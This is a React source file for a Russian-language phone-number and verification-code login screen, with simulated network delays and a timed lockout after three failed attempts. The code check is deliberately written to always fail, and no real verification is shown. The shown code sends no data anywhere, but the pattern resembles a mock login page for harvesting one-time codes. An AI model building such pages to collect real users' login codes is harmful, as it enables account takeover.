
import React, { useState, useEffect, useCallback } from 'react';
import { Logo } from './components/Logo';
import { PhoneStep } from './components/PhoneStep';
import { CodeStep } from './components/CodeStep';
import { AppStep } from './types';
import { getBlockState, registerCodeFailure, formatTimeRemaining } from './utils';

const App: React.FC = () => {
  const [step, setStep] = useState<AppStep>(AppStep.PHONE_INPUT);
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [blockError, setBlockError] = useState<string | null>(null);
  
  // Force re-render periodically to update block countdowns
  const [, setTick] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => setTick(t => t + 1), 1000);
    return () => clearInterval(interval);
  }, []);

  const checkStatus = useCallback(() => {
    const state = getBlockState();
    if (state.isBlocked && state.blockUntil > Date.now()) {
      const remaining = state.blockUntil - Date.now();
      return {
        blocked: true,
        message: `Слишком много попыток. Попробуйте через ${formatTimeRemaining(remaining)}.`
      };
    }
    return { blocked: false, message: null };
  }, []);

  // Initial check on mount to ensure blocked users can't click continue
  useEffect(() => {
    const status = checkStatus();
    if (status.blocked) {
      setBlockError(status.message);
    }
  }, [checkStatus]);

  // Periodic check to update message if blocked
  useEffect(() => {
    const status = checkStatus();
    if (status.blocked) {
      setBlockError(status.message);
    } else if (blockError && blockError.includes('Слишком много попыток')) {
        // Clear block error if time expired
        setBlockError(null);
    }
  }, [checkStatus, blockError]); // depend on blockError so we don't clear manual errors, but update time blocks

  const handlePhoneContinue = (phone: string) => {
    const status = checkStatus();
    if (status.blocked) {
      setBlockError(status.message);
      return;
    }

    setBlockError(null);
    setIsLoading(true);

    // Simulate network
    setTimeout(() => {
      setIsLoading(false);
      
      const currentStatus = checkStatus();
      if (currentStatus.blocked) {
        setBlockError(currentStatus.message || 'Доступ ограничен');
        return;
      }
      
      setPhoneNumber(phone);
      setStep(AppStep.CODE_VERIFICATION);
    }, 1200);
  };

  const handleCodeAttempt = (code: string) => {
    setIsLoading(true);
    setBlockError(null);

    // Simulate network
    setTimeout(() => {
      setIsLoading(false);
      
      const status = checkStatus();
      if (status.blocked) {
        setBlockError(status.message || 'Ошибка');
        return;
      }

      // Verify code (Always fail logic)
      const newState = registerCodeFailure();
      
      if (newState.isBlocked) {
         // Just got blocked (3rd strike)
         // Calculate remaining immediately to avoid 0:00 glitch
         const remaining = newState.blockUntil - Date.now();
         const msg = `Слишком много попыток. Попробуйте через ${formatTimeRemaining(remaining)}.`;
         setBlockError(msg);
      } else {
         setBlockError('Неверный код. Попробуйте еще раз.');
      }
    }, 1000);
  };

  return (
    <div className="min-h-screen bg-white flex flex-col items-center overflow-hidden relative font-sans">
      {/* Top Gradient Header */}
      <div className="absolute top-0 left-0 right-0 h-72 pointer-events-none z-0 overflow-hidden">
        {/* Яркая переливающаяся полоска между фиолетовым и сине-голубым */}
        <div className="absolute inset-[-10%] bg-[linear-gradient(to_bottom,_#C79CFF_0%,_#B28CFF_25%,_#7FA9FF_55%,_#E9F0FF_85%,_#FFFFFF_100%)] opacity-100 animate-header-glow mix-blend-normal"></div>
        {/* Плавный градиент вниз для мягкого перехода в белый фон */}
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-white/40 to-white"></div>
      </div>
      
      {/* Header */}
      <div className="mt-16 z-10">
        {step === AppStep.PHONE_INPUT && <Logo />}
      </div>

      {step === AppStep.PHONE_INPUT ? (
        <PhoneStep 
          onContinue={handlePhoneContinue} 
          isLoading={isLoading}
          blockError={blockError}
        />
      ) : (
        <CodeStep 
          phone={phoneNumber}
          onBack={() => {
            setBlockError(null);
            setStep(AppStep.PHONE_INPUT);
          }}
          onAttempt={handleCodeAttempt}
          isLoading={isLoading}
          blockError={blockError}
        />
      )}
      <style>{`
        @keyframes header-glow {
          0% {
            transform: translateX(-10%) translateY(0);
            opacity: 1;
            filter: hue-rotate(-12deg) saturate(1.05);
          }
          25% {
            transform: translateX(-2%) translateY(2%);
            opacity: 0.97;
            filter: hue-rotate(5deg) saturate(1.1);
          }
          50% {
            transform: translateX(10%) translateY(1%);
            opacity: 1;
            filter: hue-rotate(18deg) saturate(1.08);
          }
          75% {
            transform: translateX(2%) translateY(-1%);
            opacity: 0.98;
            filter: hue-rotate(5deg) saturate(1.12);
          }
          100% {
            transform: translateX(-10%) translateY(0);
            opacity: 1;
            filter: hue-rotate(-12deg) saturate(1.05);
          }
        }
        .animate-header-glow {
          animation: header-glow 14s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
};

export default App;
